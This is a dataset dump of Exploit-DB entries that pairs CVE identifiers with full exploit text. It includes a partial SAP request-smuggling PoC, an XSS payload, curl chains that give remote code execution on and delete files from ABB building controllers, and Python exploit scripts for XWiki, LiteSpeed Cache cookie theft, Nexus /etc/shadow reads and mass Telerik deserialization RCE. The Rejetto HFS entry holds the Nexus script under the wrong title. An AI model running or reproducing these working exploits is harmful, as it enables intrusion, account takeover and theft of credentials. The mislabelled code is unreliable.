""/sap/public/bc/sec/saml2"", ""/sap/public/bc/webdav"" print(f""{Style.BRIGHT}{Fore.RED}[!] {Fore.WHITE}Proof of Concept for ACL Bypass via HTTP Request Smuggling{Style.RESET_ALL}\n"") for path in test_paths: try: conn_class = http.client.HTTPSConnection if is_https else http.client.HTTPConnection conn = conn_class(host, port) conn.request(""GET"", path) res_direct = conn.getresponse() content_direct = res_direct.read().decode(errors=""ignore"") direct_status = res_direct.status except Exception as e: print(f""{Fore.RED}[!] {Fore.WHITE}Error checking direct access for {path}: {e}"") continue body = build_smuggled_request(path) headers = { ""Host"": f""{host}:{port}"", ""Authorization"": ""Basic YTph"", ""Cookie"": ""saplb_*=(J2EE7364720)7364750"", ""Content-Type"": ""application/json"", ""Content-Length"": str(len(body.encode(""utf-8""))) try: conn = conn_class(host, port) conn.request(""POST"", ""/sap/admin/public/default.html"", body=body, headers=headers) res = conn.getresponse() smuggled_headers = res.getheaders() content_smuggled = res.read().decode(errors=""ignore"") smuggled_status = res.status status_color = Fore.GREEN if smuggled_status != direct_status else Fore.RED print(f""{status_color}[-] {Fore.LIGHTBLUE_EX}{path} {Style.BRIGHT}{Fore.WHITE}Direct Access: {Fore.YELLOW}({direct_status}) {Fore.WHITE}Smuggled Access: {status_color}({smuggled_status}){Style.RESET_ALL}"") if smuggled_status == direct_status: print(f""{Fore.RED}[x] {Fore.WHITE}Exploit did not work for {path}\n"") with open("""
CVE-2024-42831,2025-04-02,exploit db,"# Exploit Title: Elaine's Realtime CRM Automation 6.18.17 - Reflected XSS # Date: 09/2024 # Exploit Author: Haythem Arfaoui (CBTW Team) # Vendor Homepage: https://www.elaine.io/ # Software Link: https://www.elaine.io/en/products/elaine-marketing-automation/ # Version: 6.18.17 and below # Tested on: Windows, Linux # CVE : CVE-2024-42831 # Description A reflected cross-site scripting (XSS) vulnerability in Elaine's Realtime CRM Automation v6.18.17 allows attackers to execute arbitrary JavaScript code in the web browser of a user via injecting a crafted payload into the dialog parameter at wrapper_dialog.php. # Steps to reproduce: 1. Navigate to any website that contains Elaine's Realtime CRM Automation 2. Navigate to this endpoint: /system/interface/wrapper_dialog.php 3. Append the payload *a""%20onafterscriptexecute=alert(document.domain)> *in the *""dialog*"" param and execute the request 4. Final URL : /system/interface/wrapper_dialog.php?dialog=a""%20onafterscriptexecute=alert(document.domain)>"
CVE-2024-6298,2025-04-02,exploit db,"# Exploit Title : ABB Cylon Aspect 3.08.01 - Remote Code Execution (RCE) Vendor: ABB Ltd. Product web page: https://www.global.abb Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.08.01 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The ABB BMS/BAS controller suffers from a remote code execution vulnerability. The vulnerable uploadFile() function in bigUpload.php improperly reads raw POST data using the php://input wrapper without sufficient validation. This data is passed to the fwrite() function, allowing arbitrary file writes. Combined with an improper sanitization of file paths, this leads to directory traversal, allowing an attacker to upload malicious files to arbitrary locations. Once a malicious file is written to an executable directory, an authenticated attacker can trigger the file to execute code and gain unauthorized access to the building controller. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x86_64) GNU/Linux 2.6.32 (x86_64) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) Vulnerability discovered by Gjoko 'LiquidWorm' Krstic @zeroscience Advisory ID: ZSL-2024-5828 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2024-5828.php CVE ID: CVE-2024-6298 CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2024-6298 21.04.2024 $ cat project P R O J E C T 1. $ curl -X POST ""http://192.168.73.31/bigUpload.php?action=upload&key=251"" \ > -H ""Cookie: PHPSESSID=25131337"" \ > -H ""Content-Type: application/x-www-form-urlencoded"" \ > -d "" "" 2. $ curl -X POST ""http://192.168.73.31/bigUpload.php?action=upload&key=251"" \ > -H ""Cookie: PHPSESSID=25131337"" \ > –H ""Content-Type: application/x-www-form-urlencoded"" 3. $ curl -X POST ""http://192.168.73.31/bigUpload.php?action=finish"" \ > -H ""Cookie: PHPSESSID=25131337"" \ > -H ""Content-Type: application/x-www-form-urlencoded"" \ > -d ""key=251&name=../../../../../../../home/MIX_CMIX/htmlroot/ZSL.php"" 4. $ curl http://192.168.73.31/ZSL.php?j=id uid=33(www-data) gid=33(www-data) groups=33(www-data)"
CVE-2024-6209,2025-04-02,exploit db,"# Exploit Title : ABB Cylon Aspect 3.08.01 - Arbitrary File Delete Vendor: ABB Ltd. Product web page: https://www.global.abb Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.08.01 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The BMS/BAS controller suffers from an arbitrary file deletion vulnerability. Input passed to the 'file' parameter in 'databasefiledelete.php' is not properly sanitised before being used to delete files. This can be exploited by an unauthenticated attacker to delete files with the permissions of the web server using directory traversal sequences passed within the affected POST parameter. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x86_64) GNU/Linux 2.6.32 (x86_64) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) Vulnerability discovered by Gjoko 'LiquidWorm' Krstic @zeroscience Advisory ID: ZSL-2024-5827 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2024-5827.php CVE ID: CVE-2024-6209 CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2024-6209 21.04.2024 $ cat project P R O J E C T $ curl -X POST http://192.168.73.31/databaseFileDelete.php \ > -d ""file0=../../../../../../../../../home/MIX_CMIX/htmlroot/validate/validateHeader.php \ > &delete0=1 \ > &total=1 \ > &submitDeleteForm=Delete"""
CVE-2023-48292,2025-03-29,exploit db,"# Exploit Title: CVE-2023-48292 Remote Code Execution Exploit # Google Dork: N/A # Date: 23 March 2025 # Exploit Author: Mehran Seifalinia # Vendor Homepage: https://www.xwiki.org/ # Software Link: https://www.xwiki.org/xwiki/bin/view/Download/ # Version: XWiki Standard 14.10 # Tested on: Ubuntu 20.04 LTS with OpenJDK 11 # CVE : CVE-2023-48292 from argparse import ArgumentParser import sys import logging from requests import get, post, RequestException import validators # Constants CVE_NAME = ""CVE-2023-48292"" HEADERS = { ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"" # Configure logging def setup_logging(logfile): logger = logging.getLogger() logger.setLevel(logging.INFO) # Create a logging handler for console output console_handler = logging.StreamHandler(sys.stdout) console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')) logger.addHandler(console_handler) # Create a logging handler for file output file_handler = logging.FileHandler(logfile) file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')) logger.addHandler(file_handler) def validate_url(url): Validate the URL to ensure it has the correct format and starts with 'http://' or 'https://'. if not validators.url(url): logging.error(""Invalid target URL format. It must start with 'http://' or 'https://'."") sys.exit(1) return url.rstrip(""/"") def check_vulnerability(target_url, method): Check if the target URL is vulnerable to the CVE-2023-48292 vulnerability. We send a test payload and inspect the response to determine if the vulnerability exists. try: # Test payload to check for vulnerability test_payload = ""echo 'testtesttest1234'"" # Payload to execute a test command on the target system vulnerable_url = f""{target_url}/xwiki/bin/view/Admin/RunShellCommand?command={test_payload}"" if method == ""GET"": response = get(vulnerable_url, headers=HEADERS) else: # method == ""POST"" response = post(vulnerable_url, headers=HEADERS) if response.status_code == 200 and ""testtesttest1234"" in response.text: logging.info(""Target is vulnerable! Command execution test succeeded."") return True else: logging.info(""Target does not appear to be vulnerable."") return False except RequestException as error: logging.error(f""HTTP Request Error: {error}"") sys.exit(1) def perform_attack(target_url, payload, method): Perform the attack by sending a custom payload to the vulnerable server. try: logging.info(f""Attempting attack with payload: {payload}"") vulnerable_url = f""{target_url}/xwiki/bin/view/Admin/RunShellCommand?command={payload}"" if method == ""GET"": response = get(vulnerable_url, headers=HEADERS) else: # method == ""POST"" response = post(vulnerable_url, headers=HEADERS) if response.status_code == 200: logging.info(f""Attack successful! Response: {response.text[:100]}..."") # Display a snippet of the response else: logging.warning(""Attack attempt failed."") except RequestException as error: logging.error(f""HTTP Request Error: {error}"") sys.exit(1) def main(): Main function to parse command-line arguments, check for vulnerability, and optionally perform the attack. parser = ArgumentParser(description=f""{CVE_NAME} Exploit Script"") parser.add_argument(""target"", help=""Target URL (e.g., https://vulnsite.com)"") parser.add_argument(""--exploit"", action=""store_true"", help=""Perform attack with a payload"") parser.add_argument(""--payload"", default=""echo 'testtesttest1234'"", help=""Custom payload for exploitation"") parser.add_argument(""--method"", choices=[""GET"", ""POST""], default=""GET"", help=""HTTP method to use (GET or POST)"") parser.add_argument(""--logfile"", default=""exploit.log"", help=""Log file to store results"") args = parser.parse_args() # Set up logging to file and console setup_logging(args.logfile) # Validate the target URL target_url = validate_url(args.target) logging.info(""Checking the target for vulnerability..."") if check_vulnerability(target_url, args.method): if args.exploit: # Perform the attack with the provided payload perform_attack(target_url, args.payload, args.method) else: logging.info(""Run with '--exploit' to attempt the attack."") else: logging.warning(""The target is not vulnerable. Exiting."") if __name__ == ""__main__"": main()"
CVE-2024-44000,2025-03-28,exploit db,"# Exploit Title: Litespeed Cache 6.5.0.1 - Authentication Bypass # Google Dork: [if applicable] # Date: reported on 17 September 2024 # Exploit Author: Gnzls # Vendor Homepage: https://www.litespeedtech.com/ # Software Link: https://github.com/gbrsh/CVE-2024-44000?tab=readme-ov-file # Version: 6.5.0.1 # Tested on: macOS M2 pro # CVE : CVE-2024-44000 import re import sys import requests import argparse from urllib.parse import urljoin def extract_latest_cookies(log_content): user_cookies = {} pattern_cookie = re.compile(r'Cookie:\s.*?wordpress_logged_in_[^=]+=(.*?)%') for line in log_content.splitlines(): cookie_match = pattern_cookie.search(line) if cookie_match: username = cookie_match.group(1) user_cookies[username] = line return user_cookies def choose_user(user_cookies): users = list(user_cookies.keys()) if not users: print(""No users found."") sys.exit(1) # Display user options print(""Select a user to impersonate:"") for idx, user in enumerate(users): print(f""{idx + 1}. {user}"") # Get the user's choice choice = int(input(""Pick a number: "")) - 1 if 0 <= choice < len(users): return users[choice], user_cookies[users[choice]] else: print(""Invalid selection."") sys.exit(1) print(""--- LiteSpeed Account Takeover exploit ---"") print("" (unauthorized account access)"") print(""\t\t\tby Gonzales"") parser = argparse.ArgumentParser() parser.add_argument('url', help='http://wphost') if len(sys.argv) == 1: parser.print_help() sys.exit(1) args = parser.parse_args() log_file_url = urljoin(args.url, 'wp-content/debug.log') response = requests.get(log_file_url) if response.status_code == 200: log_content = response.text ucookies = extract_latest_cookies(log_content) choice, cookie = choose_user(ucookies) print(f""Go to {args.url}/wp-admin/ and set this cookie:"") print(cookie.split(']')[1]) else: print(""Log file not found."") sys.exit(1) 1. Overview: Purpose and Target The script aims to extract cookies (which contain session information) from a WordPress debug.log file, allowing the attacker to impersonate a logged-in user and access their account without authorization. 2. How the Code Works extract_latest_cookies Function: Purpose: This function scans the contents of the debug.log file and uses a regular expression to extract cookies for logged-in WordPress users. How it Works: The function reads each line of the debug.log file. It searches for lines that contain cookies using the following regular expression: Cookie:\s.*?wordpress_logged_in_[^=]+=(.*?)%. This pattern matches WordPress login cookies and extracts the username and cookie value. The extracted cookie values are stored in a dictionary called user_cookies, where the keys are usernames and the values are the corresponding cookie strings. choose_user Function: Purpose: Once cookies are extracted, this function allows the attacker to select which user's cookie to use for impersonation. How it Works: It checks if there are any users (i.e., cookies) available. If no cookies are found, it prints a message and exits the program. If cookies are found, it prints a list of users and asks the attacker to select one. Once a user is selected, the function returns the corresponding cookie for that user. Main Program: Purpose: The main part of the script handles the workflow of retrieving the debug.log file, extracting cookies, and allowing the attacker to choose which user to impersonate. How It Works: The script takes a URL as input, which is the target WordPress site (e.g., http://wphost). It constructs the URL to the debug.log file (http://wphost/wp-content/debug.log). The script sends an HTTP request to this URL to fetch the log file. If the file is found (response status 200), it passes the file content to the extract_latest_cookies function to extract cookies. The attacker selects which user's cookie to use, and the script prints the cookie information. The attacker can then use this cookie to impersonate the selected user by setting it in their browser and accessing the WordPress admin panel (/wp-admin/). requests Library: This library is used to send HTTP requests to the target site and retrieve the debug.log file. argparse Library: This allows the user to input the target WordPress URL from the command line. sys.exit() Function: The script uses this to exit the program in case of errors, such as when no users are found or the log file is inaccessible. 3. Potential for Abuse This script exploits a vulnerability in WordPress by targeting publicly accessible debug.log files. If a site has misconfigured logging, this file might be available to anyone on the internet. By accessing the debug.log file, an attacker can extract sensitive session cookies, impersonate users, and gain unauthorized access to WordPress accounts (including admin accounts)."
CVE-2024-8945,2025-03-28,exploit db,"# Exploit Title: CodeCanyon RISE CRM 3.7.0 - SQL Injection # Google Dork: N/A # Date: September 19, 2024 # Exploit Author: Jobyer Ahmed # Author Homepage: https://bytium.com # Vulnerable Version: 3.7 # Patched Version: 3.7.1 # Tested on: Ubuntu 24.04, Debian Testing # CVE: CVE-2024-8945 ############Instruction####################### # 1. Login to Ultimate Project Manager 3.7 # 2. Add a New Dashboard # 3. Launch the"
CVE-2024-4956,2025-03-28,exploit db,"# Exploit Title: Sonatype Nexus Repository 3.53.0-01 - Path Traversal # Google Dork: header=""Server: Nexus/3.53.0-01 (OSS)"" # Date: 2024-09-22 # Exploit Author: VeryLazyTech # GitHub: https://github.com/verylazytech/CVE-2024-4956 # Vendor Homepage: https://www.sonatype.com/nexus-repository # Software Link: https://www.sonatype.com/nexus-repository # Version: 3.53.0-01 # Tested on: Ubuntu 20.04 # CVE: CVE-2024-4956 import requests import random import argparse from colorama import Fore, Style green = Fore.GREEN magenta = Fore.MAGENTA cyan = Fore.CYAN mixed = Fore.RED + Fore.BLUE red = Fore.RED blue = Fore.BLUE yellow = Fore.YELLOW white = Fore.WHITE reset = Style.RESET_ALL bold = Style.BRIGHT colors = [green, cyan, blue] random_color = random.choice(colors) def banner(): banner = f""""""{bold}{random_color} | |___ \ V / | |___ / __/| |_| / __/|__ _| |__ _\__, |___) | (_) | \ V / __/ | | |_| | | |__| (_| |/ /| |_| | | | __/ (__| | | | {bold}{white}@VeryLazyTech - Medium {reset}\n"""""" return banner def read_ip_port_list(file_path): with open(file_path, 'r') as file: lines = file.readlines() return [line.strip() for line in lines] def make_request(ip_port, url_path): url = f""http://{ip_port}/{url_path}"" try: response = requests.get(url, timeout=5) return response.text except requests.RequestException as e: return None def main(ip_port_list): for ip_port in ip_port_list: for url_path in [""%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/passwd"", ""%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/shadow""]: response_text = make_request(ip_port, url_path) if response_text and ""nexus:x:200:200:Nexus Repository Manager user:/opt/sonatype/nexus:/bin/false"" not in response_text and ""Not Found"" not in response_text and ""400 Bad Request"" not in response_text and ""root"" in response_text: print(f""Address: {ip_port}"") print(f""File Contents for passwd:\n{response_text}"" if ""passwd"" in url_path else f""File Contents for shadow:\n{response_text}"") break if __name__ == ""__main__"": parser = argparse.ArgumentParser(description=f""[{bold}{blue}Description{reset}]: {bold}{white}Vulnerability Detection and Exploitation tool for CVE-2024-4956"", usage=argparse.SUPPRESS) group = parser.add_mutually_exclusive_group(required=True) group.add_argument(""-u"", ""--url"", type=str, help=f""[{bold}{blue}INF{reset}]: {bold}{white}Specify a URL or IP with port for vulnerability detection\n"") group.add_argument(""-l"", ""--list"", type=str, help=f""[{bold}{blue}INF{reset}]: {bold}{white}Specify a list of URLs or IPs for vulnerability detection\n"") args = parser.parse_args() if args.list: ip_port_list = read_ip_port_list(args.list) print(banner()) main(ip_port_list) elif args.url: ip_port_list = [args.url] print(banner()) main(ip_port_list) else: print(banner()) parser.print_help()"
CVE-2024-23692,2025-03-28,exploit db,"# Exploit Title: Rejetto HTTP File Server 2.3m - Remote Code Execution (RCE) # Fofa Dork: ""HttpFileServer"" && server==""HFS 2.3m"" # Date: 2024-09-22 # Exploit Author: VeryLazyTech # GitHub: https://github.com/verylazytech/CVE-2024-23692 # Vendor Homepage: http://rejetto.com/hfs/ # Software Link: http://rejetto.com/hfs/ # Version: 2.3m # Tested on: Windows 10 # CVE: CVE-2024-23692 import requests import random import argparse from colorama import Fore, Style green = Fore.GREEN magenta = Fore.MAGENTA cyan = Fore.CYAN mixed = Fore.RED + Fore.BLUE red = Fore.RED blue = Fore.BLUE yellow = Fore.YELLOW white = Fore.WHITE reset = Style.RESET_ALL bold = Style.BRIGHT colors = [green, cyan, blue] random_color = random.choice(colors) def banner(): banner = f""""""{bold}{random_color} | |___ \ V / | |___ / __/| |_| / __/|__ _| |__ _\__, |___) | (_) | \ V / __/ | | |_| | | |__| (_| |/ /| |_| | | | __/ (__| | | | {bold}{white}@VeryLazyTech - Medium {reset}\n"""""" return banner def read_ip_port_list(file_path): with open(file_path, 'r') as file: lines = file.readlines() return [line.strip() for line in lines] def make_request(ip_port, url_path): url = f""http://{ip_port}/{url_path}"" try: response = requests.get(url, timeout=5) return response.text except requests.RequestException as e: return None def main(ip_port_list): for ip_port in ip_port_list: for url_path in [""%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/passwd"", ""%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/shadow""]: response_text = make_request(ip_port, url_path) if response_text and ""nexus:x:200:200:Nexus Repository Manager user:/opt/sonatype/nexus:/bin/false"" not in response_text and ""Not Found"" not in response_text and ""400 Bad Request"" not in response_text and ""root"" in response_text: print(f""Address: {ip_port}"") print(f""File Contents for passwd:\n{response_text}"" if ""passwd"" in url_path else f""File Contents for shadow:\n{response_text}"") break if __name__ == ""__main__"": parser = argparse.ArgumentParser(description=f""[{bold}{blue}Description{reset}]: {bold}{white}Vulnerability Detection and Exploitation tool for CVE-2024-4956"", usage=argparse.SUPPRESS) group = parser.add_mutually_exclusive_group(required=True) group.add_argument(""-u"", ""--url"", type=str, help=f""[{bold}{blue}INF{reset}]: {bold}{white}Specify a URL or IP with port for vulnerability detection\n"") group.add_argument(""-l"", ""--list"", type=str, help=f""[{bold}{blue}INF{reset}]: {bold}{white}Specify a list of URLs or IPs for vulnerability detection\n"") args = parser.parse_args() if args.list: ip_port_list = read_ip_port_list(args.list) print(banner()) main(ip_port_list) elif args.url: ip_port_list = [args.url] print(banner()) main(ip_port_list) else: print(banner()) parser.print_help()"
CVE-2024-4358,2025-03-28,exploit db,"# Exploit Title: Progress Telerik Report Server 2024 Q1 (10.0.24.305) - Authentication Bypass # Fofa Dork: title=""Telerik Report Server"" # Date: 2024-09-22 # Exploit Author: VeryLazyTech # GitHub: https://github.com/verylazytech/CVE-2024-4358 # Vendor Homepage: https://www.telerik.com/report-server # Software Link: https://www.telerik.com/report-server # Version: 2024 Q1 (10.0.24.305) and earlier # Tested on: Windows Server 2019 # CVE: CVE-2024-4358 import aiohttp import asyncio from alive_progress import alive_bar from colorama import Fore, Style import os import aiofiles import time import random import argparse from fake_useragent import UserAgent import uvloop import string import zipfile import base64 green = Fore.GREEN magenta = Fore.MAGENTA cyan = Fore.CYAN mixed = Fore.RED + Fore.BLUE red = Fore.RED blue = Fore.BLUE yellow = Fore.YELLOW white = Fore.WHITE reset = Style.RESET_ALL bold = Style.BRIGHT colors = [ green, cyan, blue] random_color = random.choice(colors) def banner(): banner = f""""""{bold}{random_color} | |___ \ V / | |___ / __/| |_| / __/|__ _|_____|__ _|__) |__) | (_) | \ V / __/ | | |_| | | |__| (_| |/ /| |_| | | | __/ (__| | | | {bold}{white}@VeryLazyTech - Medium {reset}\n"""""" return banner print(banner()) parser = argparse.ArgumentParser(description=f""[{bold}{blue}Description{reset}]: {bold}{white}Vulnerability Detection and Exploitation tool for CVE-2024-4358"" , usage=argparse.SUPPRESS) parser.add_argument(""-u"", ""--url"", type=str, help=f""[{bold}{blue}INF{reset}]: {bold}{white}Specify a URL or IP wtih port for vulnerability detection"") parser.add_argument(""-l"", ""--list"", type=str, help=f""[{bold}{blue}INF{reset}]: {bold}{white}Specify a list of URLs or IPs for vulnerability detection"") parser.add_argument(""-c"", ""--command"", type=str, default=""id"", help=f""[{bold}{blue}INF{reset}]: {bold}{white}Specify a shell command to execute it"") parser.add_argument(""-t"", ""--threads"", type=int, default=1, help=f""[{bold}{blue}INF{reset}]: {bold}{white}Number of threads for list of URLs"") parser.add_argument(""-proxy"", ""--proxy"", type=str, help=f""[{bold}{blue}INF{reset}]: {bold}{white}Proxy URL to send request via your proxy"") parser.add_argument(""-v"", ""--verbose"", action=""store_true"", help=f""[{bold}{blue}INF{reset}]: {bold}{white}Increases verbosity of output in console"") parser.add_argument(""-o"", ""--output"", type=str, help=f""[{bold}{blue}INF{reset}]: {bold}{white}Filename to save output of vulnerable target{reset}]"") args=parser.parse_args() async def report(result): try: if args.output: if os.path.isfile(args.output): filename = args.output elif os.path.isdir(args.output): filename = os.path.join(args.output, f""results.txt"") else: filename = args.output else: filename = ""results.txt"" async with aiofiles.open(filename, ""a"") as w: await w.write(result + '\n') except KeyboardInterrupt as e: quit() except asyncio.CancelledError as e: SystemExit except Exception as e: pass async def randomizer(): try: strings = string.ascii_letters return ''.join(random.choices(strings, k=30)) except Exception as e: print(f""Exception in randomizer :{e}, {type(e)}"") async def exploit(payload,url, authToken, session, user, psw): try: randomReport = await randomizer() headers = {""Authorization"" : f""Bearer {authToken}""} body1 = {""reportName"":randomReport, ""categoryName"":""Samples"", ""description"":None, ""reportContent"":payload, ""extension"":"".trdp"" proxy = args.proxy if args.proxy else None async with session.post( f""{url}/api/reportserver/report"", ssl=False, timeout=30, proxy=proxy, json=body1, headers=headers) as response1: if response1.status !=200: print(f""[{bold}{green}Vulnerale{reset}]: {bold}{white}Report for: {url}\n Login Crendentials: Usename: {user} | Password: {psw} | Authentication Token: {authToken}\n Deserialization RCE: Failed{reset}"") await report(f""Report for: {url}\n Login Crendentials: Usename: {user} | Password: {psw} | Authentication Token: {authToken}\n Deserialization RCE: Failed\n----------------------------------"") return async with session.post( f""{url}/api/reports/clients"", json={""timeStamp"":None}, ssl=False, timeout=30) as response2: if response2.status == 200: responsed2 = await response2.json() id = responsed2['clientId'] else: print(f""[{bold}{green}Vulnerale{reset}]: {bold}{white}Report for: {url}\n Login Crendentials: Usename: {user} | Password: {psw} | Authentication Token: {authToken}\n Report created: {randomReport}\n Deserialization RCE: Failed{reset}"") await report(f""Report for: {url}\n Login Crendentials: Usename: {user} | Password: {psw} | Authentication Token: {authToken}\n Report created: {randomReport}\n Deserialization RCE: Failed\n----------------------------------"") return body2 ={""report"":f""NAME/Samples/{randomReport}/"", ""parameterValues"":{} async with session.post( f""{url}/api/reports/clients/{id}/parameters"", json=body2, proxy=proxy, ssl=False, timeout=30) as finalresponse: print(f""[{bold}{green}Vulnerale{reset}]: {bold}{white}Report for: {url}\n Login Crendentials: Usename: {user} | Password: {psw} | Authentication Token: {authToken}\n Report created: {randomReport}\n Deserialization RCE: Success{reset}"") await report(f""Report for: {url}\n Login crendential: Usename: {user} | Password: {psw} | Authentication Token: {authToken}\n Report created: {randomReport}\n Deserialization RCE: Success\n----------------------------------"") except KeyError as e: pass except aiohttp.ClientConnectionError as e: if args.verbose: print(f""[{bold}{yellow}WRN{reset}]: {bold}{white}Timeout reached for {url}{reset}"") except TimeoutError as e: if args.verbose: print(f""[{bold}{yellow}WRN{reset}]: {bold}{white}Timeout reached for {url}{reset}"") except KeyboardInterrupt as e: SystemExit except aiohttp.client_exceptions.ContentTypeError as e: pass except asyncio.CancelledError as e: SystemExit except aiohttp.InvalidURL as e: pass except Exception as e: print(f""Exception at authexploit: {e}, {type(e)}"") async def create(url,user, psw, session): try: base_url=f""{url}/Startup/Register"" body = {""Username"": user, ""Password"": psw, ""ConfirmPassword"": psw, ""Email"": f""{user}@{user}.org"", ""FirstName"": user, ""LastName"": user} headers = { ""User-Agent"": UserAgent().random, ""Content-Type"": ""application/x-www-form-urlencoded"", async with session.post(base_url, headers=headers, data=body, ssl=False, timeout=30) as response: if response.status == 200: return ""success"" return ""failed"" except KeyError as e: pass except aiohttp.ClientConnectionError as e: if args.verbose: print(f""[{bold}{yellow}WRN{reset}]: {bold}{white}Timeout reached for {url}{reset}"") except TimeoutError as e: if args.verbose: print(f""[{bold}{yellow}WRN{reset}]: {bold}{white}Timeout reached for {url}{reset}"") except KeyboardInterrupt as e: SystemExit except asyncio.CancelledError as e: SystemExit except aiohttp.InvalidURL as e: pass except aiohttp.client_exceptions.ContentTypeError as e: pass except Exception as e: print(f""Exception at authexploitcreate: {e}, {type(e)}"") async def login(url, user, psw, session): try: base_url = f""{url}/Token"" body = {""grant_type"": ""password"",""username"":user, ""password"": psw} headers = { ""User-Agent"": UserAgent().random, ""Content-Type"": ""application/x-www-form-urlencoded"", async with session.post( base_url, data=body, headers=headers, ssl=False, timeout=30) as response: if response.status == 200: responsed = await response.json() return responsed['access_token'] except KeyError as e: pass except aiohttp.ClientConnectionError as e: if args.verbose: print(f""[{bold}{yellow}WRN{reset}]: {bold}{white}Timeout reached for {url}{reset}"") except TimeoutError as e: if args.verbose: print(f""[{bold}{yellow}WRN{reset}]: {bold}{white}Timeout reached for {url}{reset}"") except KeyboardInterrupt as e: SystemExit except asyncio.CancelledError as e: SystemExit except aiohttp.InvalidURL as e: pass except aiohttp.client_exceptions.ContentTypeError as e: pass except Exception as e: print(f""Exception at authexploitLogin: {e}, {type(e)}"") async def streamwriter(): try: with zipfile.ZipFile(""payloads.trdp"", 'w') as zipf: zipf.writestr('[Content_Types].xml', ''' ''') zipf.writestr(""definition.xml"", f''' ''') except Exception as e: print(f""Exception at streamwriter: {e}, {type(e)}"") async def streamreader(file): try: async with aiofiles.open(file, 'rb') as file: contents = await file.read() bs64encrypted = base64.b64encode(contents).decode('utf-8') return bs64encrypted except Exception as e: print(f""Exception at streamreder: {e}, {type(e)}"") async def core(url, sem, bar): try: user = await randomizer() password = await randomizer() async with aiohttp.ClientSession() as session: status = await create(url, user, password, session) if status == ""success"": await asyncio.sleep(0.001) authJWT = await login(url, user, password, session) if authJWT: payloads = await streamreader(""payloads.trdp"") await exploit(payloads, url, authJWT, session, user, password) await asyncio.sleep(0.002) except Exception as e: print(f""Exception at core: {e}, {type(e)}"") finally: bar() sem.release() async def loader(urls, session, sem, bar): try: tasks = [] for url in urls: await sem.acquire() task = asyncio.ensure_future(core(url, sem, bar)) tasks.append(task) await asyncio.gather(*tasks, return_exceptions=True) except KeyboardInterrupt as e: SystemExit except asyncio.CancelledError as e: SystemExit except Exception as e: print(f""Exception in loader: {e}, {type(e)}"") async def threads(urls): try: urls = list(set(urls)) sem = asyncio.BoundedSemaphore(args.threads) customloops = uvloop.new_event_loop() asyncio.set_event_loop(loop=customloops) loops = asyncio.get_event_loop() async with aiohttp.ClientSession(loop=loops) as session: with alive_bar(title=f""Exploiter"", total=len(urls), enrich_print=False) as bar: loops.run_until_complete(await loader(urls, session, sem, bar)) except RuntimeError as e: pass except KeyboardInterrupt as e: SystemExit except Exception as e: print(f""Exception in threads: {e}, {type(e)}"") async def main(): try: urls = [] if args.url: if args.url.startswith(""https://"") or args.url.startswith(""http://""): urls.append(args.url) else: new_url = f""https://{args.url}"" urls.append(new_url) new_http = f""http://{args.url}"" urls.append(new_http) await streamwriter() await threads(urls) if args.list: async with aiofiles.open(args.list, ""r"") as streamr: async for url in streamr: url = url.strip() if url.startswith(""https://"") or url.startswith(""http://""): urls.append(url) else: new_url = f""https://{url}"" urls.append(new_url) new_http = f""http://{url}"" urls.append(new_http) await streamwriter() await threads(urls) except FileNotFoundError as e: print(f""[{bold}{red}WRN{reset}]: {bold}{white}{args.list} no such file or directory{reset}"") SystemExit except Exception as e: print(f""Exception in main: {e}, {type(3)})"") if __name__ == ""__main__"": asyncio.run(main())"
CVE-2024-44871,2025-03-27,exploit db,"# Exploit Title: MoziloCMS 3.0 - Remote Code Execution (RCE) # Date: 10/09/2024 # Exploit Author: Secfortress (https://github.com/sec-fortress) # Vendor Homepage: https://mozilo.de/ # Software Link: https://github.com/moziloDasEinsteigerCMS/mozilo3.0/archive/refs/tags/3.0.1.zip # Version: 3.0 # Tested on: Debian # Reference: https://vulners.com/cve/CVE-2024-44871 # CVE : CVE-2024-44871 # Description # MoziloCMS version 3.0 suffers from an arbitrary file upload vulnerability in the component ""/admin/index.php"" which allows an authenticated attacker to execute arbitrary code on the ""Files"" session by uploading a maliciously crafted .JPG file and subsequently renaming its extension to .PHP using the application's renaming function."
